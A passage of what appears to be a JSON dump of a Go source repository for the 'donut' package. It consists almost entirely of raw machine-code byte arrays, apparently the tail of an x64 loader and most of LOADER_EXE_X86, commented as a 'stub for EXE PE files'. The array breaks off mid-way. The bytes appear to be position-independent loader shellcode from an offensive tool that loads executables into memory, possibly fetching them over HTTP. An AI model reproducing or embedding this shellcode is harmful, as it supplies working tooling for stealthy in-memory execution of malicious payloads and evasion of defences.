0x00, 0x00, 0x00, 0x48, 0x8b, 0x4d, 0xe0, \n  0x44, 0x33, 0xce, 0x45, 0x2b, 0xd1, 0x44, 0x8b, 0xce, 0x41, 0xc1, 0xe2, \n  0x08, 0x44, 0x0f, 0xb6, 0x19, 0x41, 0x81, 0xc3, 0x00, 0xfe, 0xff, 0xff, \n  0x45, 0x03, 0xda, 0x48, 0x03, 0xce, 0x48, 0x89, 0x4d, 0xe0, 0x48, 0x8d, \n  0x4d, 0xe0, 0xe8, 0xa5, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x4d, 0xe0, 0x46, \n  0x8d, 0x0c, 0x48, 0xe8, 0x98, 0x00, 0x00, 0x00, 0x85, 0xc0, 0x75, 0xe6, \n  0x41, 0x81, 0xfb, 0x00, 0x7d, 0x00, 0x00, 0x41, 0x8d, 0x41, 0x01, 0x41, \n  0x0f, 0x42, 0xc1, 0x41, 0x81, 0xfb, 0x00, 0x05, 0x00, 0x00, 0x8d, 0x48, \n  0x01, 0x0f, 0x42, 0xc8, 0x41, 0x81, 0xfb, 0x80, 0x00, 0x00, 0x00, 0x44, \n  0x8d, 0x41, 0x02, 0x44, 0x0f, 0x43, 0xc1, 0x45, 0x85, 0xc0, 0x74, 0x1b, \n  0x48, 0x8b, 0x4d, 0xe8, 0x41, 0x8b, 0xd3, 0x48, 0xf7, 0xda, 0x8a, 0x04, \n  0x0a, 0x88, 0x01, 0x48, 0x03, 0xce, 0x45, 0x03, 0xc6, 0x75, 0xf3, 0x48, \n  0x89, 0x4d, 0xe8, 0x44, 0x8b, 0xce, 0xeb, 0x1d, 0x48, 0x8b, 0x55, 0xe0, \n  0x48, 0x8b, 0x4d, 0xe8, 0x8a, 0x02, 0x88, 0x01, 0x48, 0x03, 0xce, 0x48, \n  0x03, 0xd6, 0x48, 0x89, 0x4d, 0xe8, 0x48, 0x89, 0x55, 0xe0, 0x45, 0x33, \n  0xc9, 0x85, 0xff, 0x0f, 0x84, 0x20, 0xfe, 0xff, 0xff, 0x8b, 0x45, 0xe8, \n  0x48, 0x8b, 0x74, 0x24, 0x58, 0x2b, 0xc3, 0x48, 0x8b, 0x5c, 0x24, 0x50, \n  0x48, 0x8b, 0x7c, 0x24, 0x60, 0x4c, 0x8b, 0x74, 0x24, 0x68, 0x48, 0x83, \n  0xc4, 0x40, 0x5d, 0xc3, 0x8b, 0x51, 0x14, 0x4c, 0x8d, 0x41, 0x10, 0x8d, \n  0x42, 0xff, 0x89, 0x41, 0x14, 0x85, 0xd2, 0x75, 0x17, 0x48, 0x8b, 0x11, \n  0x0f, 0xb6, 0x02, 0x41, 0x89, 0x00, 0x48, 0x8d, 0x42, 0x01, 0x48, 0x89, \n  0x01, 0xc7, 0x41, 0x14, 0x07, 0x00, 0x00, 0x00, 0x41, 0x8b, 0x00, 0x8d, \n  0x0c, 0x00, 0xc1, 0xe8, 0x07, 0x83, 0xe0, 0x01, 0x41, 0x89, 0x08, 0xc3, \n  0x4c, 0x8b, 0xc9, 0x45, 0x85, 0xc0, 0x74, 0x13, 0x48, 0x2b, 0xd1, 0x42, \n  0x8a, 0x04, 0x0a, 0x41, 0x88, 0x01, 0x49, 0xff, 0xc1, 0x41, 0x83, 0xc0, \n  0xff, 0x75, 0xf0, 0x48, 0x8b, 0xc1, 0xc3, 0xcc, 0x48, 0x89, 0x7c, 0x24, \n  0x08, 0x4c, 0x8b, 0xc9, 0x8a, 0xc2, 0x49, 0x8b, 0xf9, 0x41, 0x8b, 0xc8, \n  0xf3, 0xaa, 0x48, 0x8b, 0x7c, 0x24, 0x08, 0x49, 0x8b, 0xc1, 0xc3, 0xcc, \n  0xeb, 0x0f, 0x80, 0x3a, 0x00, 0x74, 0x10, 0x3a, 0x02, 0x75, 0x0c, 0x48, \n  0xff, 0xc1, 0x48, 0xff, 0xc2, 0x8a, 0x01, 0x84, 0xc0, 0x75, 0xeb, 0x0f, \n  0xbe, 0x01, 0x0f, 0xbe, 0x0a, 0x2b, 0xc1, 0xc3, 0xeb, 0x19, 0x44, 0x8a, \n  0x02, 0x45, 0x84, 0xc0, 0x74, 0x17, 0x41, 0x80, 0xc8, 0x20, 0x0c, 0x20, \n  0x41, 0x3a, 0xc0, 0x75, 0x0c, 0x48, 0xff, 0xc1, 0x48, 0xff, 0xc2, 0x8a, \n  0x01, 0x84, 0xc0, 0x75, 0xe1, 0x0f, 0xbe, 0x01, 0x0f, 0xbe, 0x0a, 0x2b, \n  0xc1, 0xc3};\n\n"
        },
        {
          "name": "loader_exe_x86.go",
          "type": "blob",
          "size": 71.1748046875,
          "content": "package donut\n\n// LOADER_EXE_X86 - stub for EXE PE files\nvar LOADER_EXE_X86 = []byte{\n\n  0x81, 0xec, 0xd4, 0x02, 0x00, 0x00, 0x53, 0x55, 0x56, 0x8b, 0xb4, 0x24, \n  0xe4, 0x02, 0x00, 0x00, 0x33, 0xdb, 0x57, 0x8b, 0xfb, 0x39, 0x9e, 0x38, \n  0x02, 0x00, 0x00, 0x0f, 0x84, 0xea, 0x00, 0x00, 0x00, 0xff, 0x76, 0x2c, \n  0xff, 0x76, 0x28, 0xff, 0xb6, 0x8c, 0x00, 0x00, 0x00, 0xff, 0xb6, 0x88, \n  0x00, 0x00, 0x00, 0x56, 0xe8, 0x45, 0x28, 0x00, 0x00, 0x8b, 0xf8, 0x83, \n  0xc4, 0x14, 0x85, 0xff, 0x0f, 0x84, 0xc0, 0x00, 0x00, 0x00, 0x53, 0x53, \n  0x56, 0xe8, 0x2d, 0x26, 0x00, 0x00, 0x8b, 0xc8, 0xb8, 0xd7, 0x22, 0x40, \n  0x00, 0x2d, 0x7b, 0x36, 0x40, 0x00, 0x03, 0xc8, 0x51, 0x53, 0x53, 0xff, \n  0xd7, 0xff, 0x76, 0x2c, 0x8b, 0xf8, 0xff, 0x76, 0x28, 0xff, 0xb6, 0x0c, \n  0x02, 0x00, 0x00, 0xff, 0xb6, 0x08, 0x02, 0x00, 0x00, 0x56, 0xe8, 0x03, \n  0x28, 0x00, 0x00, 0xff, 0x76, 0x2c, 0x89, 0x44, 0x24, 0x28, 0xff, 0x76, \n  0x28, 0xff, 0xb6, 0xa4, 0x00, 0x00, 0x00, 0xff, 0xb6, 0xa0, 0x00, 0x00, \n  0x00, 0x56, 0xe8, 0xe7, 0x27, 0x00, 0x00, 0xff, 0x76, 0x2c, 0x8b, 0xd8, \n  0xff, 0x76, 0x28, 0xff, 0xb6, 0xac, 0x00, 0x00, 0x00, 0xff, 0xb6, 0xa8, \n  0x00, 0x00, 0x00, 0x56, 0xe8, 0xcd, 0x27, 0x00, 0x00, 0x83, 0xc4, 0x3c, \n  0x8b, 0xe8, 0x6a, 0x00, 0xff, 0x56, 0x38, 0x83, 0x7c, 0x24, 0x10, 0x00, \n  0x89, 0x44, 0x24, 0x14, 0x74, 0x4c, 0x85, 0xdb, 0x74, 0x48, 0x85, 0xed, \n  0x74, 0x44, 0x8d, 0x44, 0x24, 0x18, 0xc7, 0x44, 0x24, 0x18, 0x07, 0x00, \n  0x01, 0x00, 0x50, 0xff, 0xd5, 0x50, 0xff, 0xd3, 0x8b, 0x86, 0x38, 0x02, \n  0x00, 0x00, 0x03, 0x44, 0x24, 0x14, 0x83, 0xa4, 0x24, 0xdc, 0x00, 0x00, \n  0x00, 0xfc, 0x89, 0x84, 0x24, 0xd0, 0x00, 0x00, 0x00, 0x8d, 0x44, 0x24, \n  0x18, 0x6a, 0x00, 0x50, 0xff, 0x54, 0x24, 0x18, 0xeb, 0x0c, 0x83, 0xc8, \n  0xff, 0xeb, 0x09, 0x56, 0xe8, 0xc6, 0x11, 0x00, 0x00, 0x59, 0x8b, 0xc7, \n  0x5f, 0x5e, 0x5d, 0x5b, 0x81, 0xc4, 0xd4, 0x02, 0x00, 0x00, 0xc3, 0x8b, \n  0x44, 0x24, 0x04, 0x83, 0xc0, 0x04, 0xf0, 0xff, 0x00, 0x8b, 0x00, 0xc2, \n  0x04, 0x00, 0xb8, 0x01, 0x40, 0x00, 0x80, 0xc2, 0x08, 0x00, 0x56, 0x57, \n  0xe8, 0x3e, 0x25, 0x00, 0x00, 0x8b, 0x74, 0x24, 0x10, 0xb9, 0xad, 0x11, \n  0x40, 0x00, 0xbf, 0x7b, 0x36, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, \n  0x0e, 0x89, 0x01, 0xe8, 0x23, 0x25, 0x00, 0x00, 0xb9, 0x1f, 0x11, 0x40, \n  0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x04, 0xe8, 0x10, \n  0x25, 0x00, 0x00, 0xb9, 0x0c, 0x12, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, \n  0x8b, 0x0e, 0x89, 0x41, 0x08, 0xe8, 0xfd, 0x24, 0x00, 0x00, 0xb9, 0x2e, \n  0x11, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x0c, \n  0xe8, 0xea, 0x24, 0x00, 0x00, 0xb9, 0x2e, 0x11, 0x40, 0x00, 0x2b, 0xcf, \n  0x03, 0xc1, 0x8b, 0x0e, 0x5f, 0x89, 0x41, 0x10, 0x8b, 0x44, 0x24, 0x08, \n  0x83, 0x66, 0x04, 0x00, 0x89, 0x46, 0x08, 0x5e, 0xc3, 0x8b, 0x4c, 0x24, \n  0x0c, 0x85, 0xc9, 0x75, 0x07, 0xb8, 0x03, 0x40, 0x00, 0x80, 0xeb, 0x4d, \n  0x53, 0x8b, 0x5c, 0x24, 0x0c, 0x33, 0xd2, 0x56, 0x8b, 0x74, 0x24, 0x0c, \n  0x57, 0x8b, 0x7e, 0x08, 0x8b, 0x84, 0x97, 0x30, 0x08, 0x00, 0x00, 0x3b, \n  0x04, 0x93, 0x75, 0x08, 0x42, 0x83, 0xfa, 0x04, 0x75, 0xee, 0xeb, 0x14, \n  0x33, 0xd2, 0x8b, 0x84, 0x97, 0xf0, 0x08, 0x00, 0x00, 0x3b, 0x04, 0x93, \n  0x75, 0x10, 0x42, 0x83, 0xfa, 0x04, 0x75, 0xee, 0x89, 0x31, 0xf0, 0xff, \n  0x46, 0x04, 0x33, 0xc0, 0xeb, 0x08, 0x83, 0x21, 0x00, 0xb8, 0x02, 0x40, \n  0x00, 0x80, 0x5f, 0x5e, 0x5b, 0xc2, 0x0c, 0x00, 0x8b, 0x4c, 0x24, 0x04, \n  0x83, 0xc8, 0xff, 0xf0, 0x0f, 0xc1, 0x41, 0x04, 0x48, 0xc2, 0x04, 0x00, \n  0x33, 0xc0, 0xc2, 0x08, 0x00, 0x55, 0x8b, 0xec, 0xf6, 0x45, 0x10, 0x02, \n  0x56, 0x8b, 0x75, 0x08, 0x57, 0x74, 0x15, 0x8b, 0x7d, 0x18, 0x85, 0xff, \n  0x74, 0x1b, 0x8b, 0x46, 0x1c, 0x50, 0x8b, 0x08, 0xff, 0x51, 0x04, 0x8b, \n  0x46, 0x1c, 0x89, 0x07, 0xf6, 0x45, 0x10, 0x01, 0x74, 0x19, 0x8b, 0x7d, \n  0x14, 0x85, 0xff, 0x75, 0x07, 0xb8, 0x03, 0x40, 0x00, 0x80, 0xeb, 0x0d, \n  0x83, 0xc6, 0x14, 0x56, 0x8b, 0x06, 0xff, 0x50, 0x04, 0x89, 0x37, 0x33, \n  0xc0, 0x5f, 0x5e, 0x5d, 0xc2, 0x14, 0x00, 0x8b, 0x44, 0x24, 0x04, 0x8b, \n  0x40, 0x2c, 0xff, 0x50, 0x54, 0x8b, 0x4c, 0x24, 0x08, 0x89, 0x01, 0x33, \n  0xc0, 0xc2, 0x08, 0x00, 0x56, 0x57, 0xe8, 0xf4, 0x23, 0x00, 0x00, 0x8b, \n  0x74, 0x24, 0x10, 0xb9, 0xbe, 0x13, 0x40, 0x00, 0xbf, 0x7b, 0x36, 0x40, \n  0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x01, 0xe8, 0xd9, 0x23, \n  0x00, 0x00, 0xb9, 0x1f, 0x11, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, \n  0x0e, 0x89, 0x41, 0x04, 0xe8, 0xc6, 0x23, 0x00, 0x00, 0xb9, 0x0c, 0x12, \n  0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x08, 0xe8, \n  0xb3, 0x23, 0x00, 0x00, 0xb9, 0x6b, 0x12, 0x40, 0x00, 0x2b, 0xcf, 0x03, \n  0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x0c, 0xe8, 0xa0, 0x23, 0x00, 0x00, 0xb9, \n  0x21, 0x12, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, \n  0x10, 0xe8, 0x8d, 0x23, 0x00, 0x00, 0xb9, 0x1c, 0x12, 0x40, 0x00, 0x2b, \n  0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x14, 0xe8, 0x7a, 0x23, 0x00, \n  0x00, 0xb9, 0xb9, 0x13, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, \n  0x89, 0x41, 0x18, 0xe8, 0x67, 0x23, 0x00, 0x00, 0xb9, 0x1c, 0x12, 0x40, \n  0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x1c, 0xe8, 0x54, \n  0x23, 0x00, 0x00, 0xb9, 0x6e, 0x13, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, \n  0x8b, 0x0e, 0x89, 0x41, 0x20, 0xe8, 0x41, 0x23, 0x00, 0x00, 0xb9, 0x69, \n  0x13, 0x40, 0x00, 0x2b, 0xcf, 0x03, 0xc1, 0x8b, 0x0e, 0x89, 0x41, 0x24, \n  0xe8, 0x2e, 0x23, 0x00, 0x00, 0xb9, 0x69, 0x13, 0x40, 0x00, 0x2b, 0xcf, \n  0x03, 0xc1, 0x8b, 0x0e, 0x5f, 0x89, 0x41, 0x28, 0x8b, 0x44, 0x24, 0x08, \n  0x83, 0x66, 0x04, 0x00, 0x89, 0x46, 0x2c, 0x5e, 0xc3, 0x33, 0xc0, 0xc2, \n  0x04, 0x00, 0x55, 0x8b, 0xec, 0x83, 0xec, 0x2c, 0x33, 0xc0, 0x56, 0x6a, \n  0x20, 0x50, 0x89, 0x45, 0xf4, 0x89, 0x45, 0xf8, 0x89, 0x45, 0xfc, 0x8d, \n  0x45, 0xd4, 0x50, 0xe8, 0x8b, 0x29, 0x00, 0x00, 0x8b, 0x75, 0x0c, 0x8d, \n  0x4d, 0xd4, 0x83, 0xc4, 0x0c, 0x8b, 0x06, 0x51, 0x56, 0xff, 0x50, 0x0c, \n  0x85, 0xc0, 0x75, 0x12, 0x8b, 0x06, 0x8d, 0x4d, 0xfc, 0x51, 0x8d, 0x4d, \n  0xf8, 0x51, 0x8d, 0x4d, 0xf4, 0x51, 0x56, 0xff, 0x50, 0x10, 0x33, 0xc0, \n  0x5e, 0xc9, 0xc2, 0x08, 0x00, 0x33, 0xc0, 0xc2, 0x0c, 0x00, 0x8b, 0x4c, \n  0x24, 0x0c, 0x85, 0xc9, 0x75, 0x07, 0xb8, 0x03, 0x40, 0x00, 0x80, 0xeb, \n  0x6c, 0x8b, 0x54, 0x24, 0x04, 0x53, 0x8b, 0x5c, 0x24, 0x0c, 0x56, 0x57, \n  0x8b, 0x7a, 0x2c, 0x33, 0xf6, 0x8b, 0x84, 0xb7, 0x30, 0x08, 0x00, 0x00, \n  0x3b, 0x04, 0xb3, 0x75, 0x08, 0x46, 0x83, 0xfe, 0x04, 0x75, 0xee, 0xeb, \n  0x14, 0x33, 0xf6, 0x8b, 0x84, 0xb7, 0xe0, 0x08, 0x00, 0x00, 0x3b, 0x04, \n  0xb3, 0x75, 0x0e, 0x46, 0x83, 0xfe, 0x04, 0x75, 0xee, 0x89, 0x11, 0xf0, \n  0xff, 0x42, 0x04, 0xeb, 0x1d, 0x33, 0xf6, 0x8b, 0x84, 0xb7, 0xf0, 0x08, \n  0x00, 0x00, 0x3b, 0x04, 0xb3, 0x75, 0x13, 0x46, 0x83, 0xfe, 0x04, 0x75, \n  0xee, 0x8d, 0x42, 0x08, 0x89, 0x01, 0xf0, 0xff, 0x42, 0x0c, 0x33, 0xc0, \n  0xeb, 0x08, 0x83, 0x21, 0x00, 0xb8, 0x02, 0x40, 0x00, 0x80, 0x5f, 0x5e, \n  0x5b, 0xc2, 0x0c, 0x00, 0x8b, 0x44, 0x24, 0x18, 0x83, 0x20, 0x00, 0x33, \n  0xc0, 0xc2, 0x18, 0x00, 0x8b, 0x44, 0x24, 0x04, 0x0f, 0xaf, 0x44, 0x24, \n  0x08, 0xc3, 0x8b, 0x44, 0x24, 0x14, 0x83, 0x20, 0x00, 0x33, 0xc0, 0xc2, \n  0x14, 0x00, 0x8b, 0x44, 0x24, 0x04, 0x03, 0x44, 0x24, 0x08, 0xc3, 0x51, \n  0x53, 0x56, 0x8b, 0x74, 0x24, 0x10, 0x8d, 0x86, 0x54, 0x03, 0x00, 0x00, \n  0x50, 0x56, 0xe8, 0x0a, 0x22, 0x00, 0x00, 0x8b, 0xd8, 0x59, 0x59, 0x85, \n  0xdb, 0x75, 0x06, 0x40, 0xe9, 0xd5, 0x00, 0x00, 0x00, 0x55, 0x57, 0x6a, \n  0x00, 0x8d, 0x86, 0xc8, 0x05, 0x00, 0x00, 0x50, 0x53, 0x56, 0xe8, 0x88, \n  0x22, 0x00, 0x00, 0x8b, 0xe8, 0x83, 0xc4, 0x10, 0x85, 0xed, 0x0f, 0x84, \n  0xb2, 0x00, 0x00, 0x00, 0xbf, 0x48, 0x14, 0x40, 0x00, 0x81, 0xef, 0x3c, \n  0x14, 0x40, 0x00, 0x0f, 0x88, 0xa1, 0x00, 0x00, 0x00, 0x8d, 0x44, 0x24, \n  0x18, 0x50, 0x6a, 0x40, 0x57, 0x55, 0xff, 0x56, 0x48, 0x85, 0xc0, 0x0f, \n  0x84, 0x8d, 0x00, 0x00, 0x00, 0x57, 0xe8, 0xa8, 0x21, 0x00, 0x00, 0xb9, \n  0x3c, 0x14, 0x40, 0x00, 0x81, 0xe9, 0x7b, 0x36, 0x40, 0x00, 0x03, 0xc1, \n  0x50, 0x55, 0xe8, 0x0c, 0x28, 0x00, 0x00, 0x83, 0xc4, 0x0c, 0x8d, 0x44, \n  0x24, 0x10, 0x50, 0xff, 0x74, 0x24, 0x1c, 0x57, 0x55, 0xff, 0x56, 0x48, \n  0x6a, 0x00, 0x8d, 0x86, 0xd8, 0x05, 0x00, 0x00, 0x50, 0x53, 0x56, 0xe8, \n  0x1b, 0x22, 0x00, 0x00, 0x8b, 0xe8, 0x83, 0xc4, 0x10, 0x85, 0xed, 0x74, \n  0x49, 0xbf, 0x5e, 0x14, 0x40, 0x00, 0xbb, 0x52, 0x14, 0x40, 0x00, 0x2b, \n  0xfb, 0x78, 0x3b, 0x8d, 0x44, 0x24, 0x18, 0x50, 0x6a, 0x40, 0x57, 0x55, \n  0xff, 0x56, 0x48, 0x85, 0xc0, 0x74, 0x2b, 0x57, 0xe8, 0x46, 0x21, 0x00, \n  0x00, 0x81, 0xeb, 0x7b, 0x36, 0x40, 0x00, 0x03, 0xc3, 0x50, 0x55, 0xe8, \n  0xaf, 0x27, 0x00, 0x00, 0x83, 0xc4, 0x0c, 0x8d, 0x44, 0x24, 0x10, 0x50, \n  0xff, 0x74, 0x24, 0x1c, 0x57, 0x55, 0xff, 0x56, 0x48, 0x33, 0xc0, 0x40, \n  0xeb, 0x02, 0x33, 0xc0, 0x5f, 0x5d, 0x5e, 0x5b, 0x59, 0xc3, 0x55, 0x8b, \n  0xec, 0x51, 0x56, 0x8b, 0x75, 0x08, 0x57, 0x8d, 0x86, 0x68, 0x03, 0x00, \n  0x00, 0x50, 0x56, 0xe8, 0x0d, 0x21, 0x00, 0x00, 0x6a, 0x00, 0x8d, 0x8e, \n  0xe8, 0x05, 0x00, 0x00, 0x51, 0x50, 0x56, 0xe8, 0x9b, 0x21, 0x00, 0x00, \n  0x8b, 0xf8, 0x83, 0xc4, 0x18, 0x85, 0xff, 0x74, 0x34, 0x8d, 0x45, 0x08, \n  0x50, 0x6a, 0x40, 0x6a, 0x04, 0x57, 0xff, 0x56, 0x48, 0x85, 0xc0, 0x74, \n  0x24, 0x6a, 0x04, 0x8d, 0x86, 0x0d, 0x06, 0x00, 0x00, 0x50, 0x57, 0xe8, \n  0x43, 0x27, 0x00, 0x00, 0x83, 0xc4, 0x0c, 0x8d, 0x45, 0xfc, 0x50, 0xff, \n  0x75, 0x08, 0x6a, 0x04, 0x57, 0xff, 0x56, 0x48, 0x33, 0xc0, 0x40, 0xeb, \n  0x02, 0x33, 0xc0, 0x5f, 0x5e, 0xc9, 0xc3, 0x81, 0xec, 0xec, 0x02, 0x00, \n  0x00, 0x53, 0x55, 0x56, 0x8b, 0xb4, 0x24, 0xfc, 0x02, 0x00, 0x00, 0x8d, \n  0x44, 0x24, 0x34, 0x57, 0x6a, 0x3c, 0x33, 0xed, 0x33, 0xdb, 0x21, 0x5c, \n  0x24, 0x24, 0xbf, 0x00, 0x03, 0x60, 0x04, 0x55, 0x50, 0xe8, 0x21, 0x27, \n  0x00, 0x00, 0x83, 0xc4, 0x0c, 0xc7, 0x44, 0x24, 0x38, 0x3c, 0x00, 0x00, \n  0x00, 0x8d, 0x84, 0x24, 0xf8, 0x01, 0x00, 0x00, 0xb9, 0x04, 0x01, 0x00, \n  0x00, 0x89, 0x44, 0x24, 0x48, 0x8d, 0x84, 0x24, 0xf4, 0x00, 0x00, 0x00, \n  0x89, 0x44, 0x24, 0x64, 0x8d, 0x44, 0x24, 0x74, 0x89, 0x44, 0x24, 0x54, \n  0x8d, 0x84, 0x24, 0xb4, 0x00, 0x00, 0x00, 0x6a, 0x40, 0x89, 0x44, 0x24, \n  0x60, 0x8d, 0x44, 0x24, 0x3c, 0x89, 0x4c, 0x24, 0x50, 0x89, 0x4c, 0x24, \n  0x6c, 0x59, 0x50, 0x68, 0x00, 0x00, 0x00, 0x10, 0x55, 0x8d, 0x86, 0x24, \n  0x09, 0x00, 0x00, 0x89, 0x4c, 0x24, 0x64, 0x50, 0x89, 0x4c, 0x24, 0x70, \n  0xff, 0x96, 0xbc, 0x00, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x84, 0x14, 0x03, \n  0x00, 0x00, 0x33, 0xc0, 0x83, 0x7c, 0x24, 0x44, 0x04, 0x0f, 0x94, 0xc0, \n  0x89, 0x44, 0x24, 0x18, 0xb8, 0x00, 0x33, 0xe0, 0x04, 0x0f, 0x44, 0xf8, \n  0x33, 0xc0, 0x50, 0x50, 0x50, 0x50, 0x50, 0x89, 0x7c, 0x24, 0x3c, 0xff, \n  0x96, 0xc0, 0x00, 0x00, 0x00, 0x89, 0x44, 0x24, 0x34, 0x85, 0xc0, 0x0f, \n  0x84, 0xe1, 0x02, 0x00, 0x00, 0x33, 0xc9, 0x51, 0x51, 0x6a, 0x03, 0x51, \n  0x51, 0xff, 0x74, 0x24, 0x64, 0x8d, 0x8c, 0x24, 0x10, 0x02, 0x00, 0x00, \n  0x51, 0x50, 0xff, 0x96, 0xc4, 0x00, 0x00, 0x00, 0x89, 0x44, 0x24, 0x30, \n  0x85, 0xc0, 0x0f, 0x84, 0x5a, 0x02, 0x00, 0x00, 0x33, 0xd2, 0x39, 0x5c, \n  0x24, 0x68, 0x75, 0x0a, 0x66, 0xc7, 0x84, 0x24, 0xf4, 0x00, 0x00, 0x00, \n  0x2f, 0x00, 0x52, 0x57, 0x52, 0x52, 0x52, 0x8d, 0x8c, 0x24, 0x08, 0x01, \n  0x00, 0x00, 0x51, 0x52, 0x50, 0xff, 0x96, 0xd8, 0x00, 0x00, 0x00, 0x8b, \n  0xf8, 0x85, 0xff, 0x0f, 0x84, 0x1f, 0x02, 0x00, 0x00, 0x39, 0x5c, 0x24, \n  0x18, 0x74, 0x22, 0xf7, 0x44, 0x24, 0x28, 0x00, 0x10, 0x00, 0x00, 0x74, \n  0x18, 0x6a, 0x04, 0x8d, 0x44, 0x24, 0x30, 0xc7, 0x44, 0x24, 0x30, 0x80, \n  0x33, 0x00, 0x00, 0x50, 0x6a, 0x1f, 0x57, 0xff, 0x96, 0xc8, 0x00, 0x00, \n  0x00, 0x39, 0x5c, 0x24, 0x58, 0x74, 0x13, 0xff, 0x74, 0x24, 0x58, 0xff, \n  0x74, 0x24, 0x58, 0x6a, 0x1c, 0x57, 0xff, 0x96, 0xc8, 0x00, 0x00, 0x00, \n  0x8b, 0xe8, 0x39, 0x5c, 0x24, 0x60, 0x74, 0x13, 0xff, 0x74, 0x24, 0x60, \n  0xff, 0x74, 0x24, 0x60, 0x6a, 0x1d, 0x57, 0xff, 0x96, 0xc8, 0x00, 0x00, \n  0x00, 0x8b, 0xe8, 0x33, 0xc0, 0x50, 0x50, 0x50, 0x50, 0x57, 0xff, 0x96, \n  0xdc, 0x00, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x84, 0xa9, 0x01, 0x00, 0x00, \n  0x6a, 0x00, 0x8d, 0x44, 0x24, 0x20, 0xc7, 0x44, 0x24, 0x20, 0x04, 0x00, \n  0x00, 0x00, 0x50, 0x8d, 0x44, 0x24, 0x28, 0x50, 0x68, 0x13, 0x00, 0x00, \n  0x20, 0x57, 0xff, 0x96, 0xe0, 0x00, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x84, \n  0x81, 0x01, 0x00, 0x00, 0x81, 0x7c, 0x24, 0x20, 0xc8, 0x00, 0x00, 0x00, \n  0x0f, 0x85, 0x73, 0x01, 0x00, 0x00, 0x21, 0x5c, 0x24, 0x10, 0x8d, 0x44, \n  0x24, 0x1c, 0x6a, 0x00, 0x50, 0x8d, 0x44, 0x24, 0x18, 0xc7, 0x44, 0x24, \n  0x24, 0x04, 0x00, 0x00, 0x00, 0x50, 0x68, 0x05, 0x00, 0x00, 0x20, 0x57, \n  0xff, 0x96, 0xe0, 0x00, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x85, 0xae, 0x00, \n  0x00, 0x00, 0xff, 0x96, 0x8c, 0x00, 0x00, 0x00, 0x3d, 0x76, 0x2f, 0x00, \n  0x00, 0x0f, 0x85, 0x36, 0x01, 0x00, 0x00, 0x33, 0xc0, 0x50, 0x50, 0x89, \n  0x44, 0x24, 0x18, 0x8d, 0x44, 0x24, 0x1c, 0x50, 0x57, 0xff, 0x96, 0xd4, \n  0x00, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x84, 0x1a, 0x01, 0x00, 0x00, 0x8b, \n  0x4c, 0x24, 0x14, 0x85, 0xc9, 0x74, 0x65, 0x8b, 0x96, 0x84, 0x00, 0x00, \n  0x00, 0x85, 0xdb, 0x75, 0x0b, 0x51, 0x6a, 0x01, 0xff, 0xd2, 0x50, 0xff, \n  0x56, 0x7c, 0xeb, 0x13, 0x8b, 0x44, 0x24, 0x10, 0x03, 0xc1, 0x50, 0x53, \n  0x6a, 0x01, 0xff, 0xd2, 0x50, 0xff, 0x96, 0x80, 0x00, 0x00, 0x00, 0x8b, \n  0xd8, 0x85, 0xdb, 0x0f, 0x84, 0xe0, 0x00, 0x00, 0x00, 0x8d, 0x44, 0x24, \n  0x24, 0x50, 0xff, 0x74, 0x24, 0x18, 0x8b, 0x44, 0x24, 0x18, 0x03, 0xc3, \n  0x50, 0x57, 0xff, 0x96, 0xcc, 0x00, 0x00, 0x00, 0x8b, 0x44, 0x24, 0x14, \n  0x01, 0x44, 0x24, 0x10, 0x8d, 0x44, 0x24, 0x14, 0x6a, 0x00, 0x6a, 0x00, \n  0x50, 0x57, 0xff, 0x96, 0xd4, 0x00, 0x00, 0x00, 0x85, 0xc0, 0x75, 0x93, \n  0x8d, 0x86, 0x84, 0x00, 0x00, 0x00, 0x89, 0x44, 0x24, 0x18, 0x85, 0xdb, \n  0x0f, 0x84, 0x9b, 0x00, 0x00, 0x00, 0xeb, 0x44, 0x39, 0x5c, 0x24, 0x10, \n  0x0f, 0x84, 0x8f, 0x00, 0x00, 0x00, 0xff, 0x74, 0x24, 0x10, 0x8d, 0x86, \n  0x84, 0x00, 0x00, 0x00, 0x6a, 0x01, 0xff, 0x10, 0x50, 0xff, 0x56, 0x7c, \n  0x8b, 0xd8, 0x85, 0xdb, 0x74, 0x77, 0x83, 0x64, 0x24, 0x24, 0x00, 0x8d, \n  0x44, 0x24, 0x24, 0x50, 0xff, 0x74, 0x24, 0x14, 0x53, 0x57, 0xff, 0x96, \n  0xcc, 0x00, 0x00, 0x00, 0x8b, 0xe8, 0x8d, 0x86, 0x84, 0x00, 0x00, 0x00, \n  0x89, 0x44, 0x24, 0x18, 0x83, 0x7c, 0x24, 0x10, 0x00, 0x74, 0x4e, 0x6a, \n  0x04, 0x68, 0x00, 0x30, 0x00, 0x00, 0xff, 0x74, 0x24, 0x18, 0x6a, 0x00, \n  0xff, 0x56, 0x3c, 0x89, 0x86, 0x60, 0x0d, 0x00, 0x00, 0x85, 0xc0, 0x74, \n  0x13, 0xff, 0x74, 0x24, 0x10, 0x53, 0x50, 0xe8, 0x17, 0x24, 0x00, 0x00, \n  0x33, 0xed, 0x83, 0xc4, 0x0c, 0x45, 0xeb, 0x02, 0x33, 0xed, 0xff, 0x74, \n  0x24, 0x10, 0x6a, 0x00, 0x53, 0xe8, 0x25, 0x24, 0x00, 0x00, 0x8b, 0x44, \n  0x24, 0x24, 0x83, 0xc4, 0x0c, 0x53, 0x6a, 0x01, 0xff, 0x10, 0x50, 0xff, \n  